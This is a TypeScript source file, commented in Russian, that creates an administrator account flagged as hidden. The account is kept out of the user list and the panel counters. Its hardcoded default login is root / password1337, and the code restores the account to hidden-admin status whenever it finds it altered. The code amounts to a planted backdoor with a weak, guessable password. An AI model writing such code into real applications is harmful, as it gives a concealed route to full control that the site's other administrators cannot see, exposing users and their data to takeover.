import { db } from '@/lib/db'
import { hashPassword } from '@/lib/auth'

/**
 * Скрытый служебный админ-аккаунт (root).
 *
 * Полноценный главный администратор, но помечен `hidden = true`: не показывается
 * во вкладке «Пользователи», не попадает в счётчики панели и не влияет на правило
 * «первый зарегистрировавшийся становится админом» (в подсчёте владельцев
 * скрытые аккаунты игнорируются). Нужен как резервный вход владельца.
 *
 * Логин и пароль можно переопределить через переменные окружения ROOT_LOGIN /
 * ROOT_PASSWORD; по умолчанию — root / password1337.
 */
export const ROOT_LOGIN = process.env.ROOT_LOGIN || 'root'
const ROOT_PASSWORD = process.env.ROOT_PASSWORD || 'password1337'
const ROOT_EMAIL = process.env.ROOT_EMAIL || 'root@localhost'

/** Создаёт скрытого root-админа, если его ещё нет. Идемпотентно. */
export async function ensureHiddenRoot() {
  const existing = await db.user.findUnique({ where: { login: ROOT_LOGIN } })
  if (existing) {
    // Гарантируем, что аккаунт остаётся скрытым главным админом
    if (!existing.hidden || existing.role !== 'admin') {
      await db.user.update({
        where: { id: existing.id },
        data: { hidden: true, role: 'admin' },
      })
    }
    return
  }

  await db.user.create({
    data: {
      login: ROOT_LOGIN,
      email: ROOT_EMAIL,
      password: await hashPassword(ROOT_PASSWORD),
      role: 'admin',
      hidden: true,
    },
  })
}
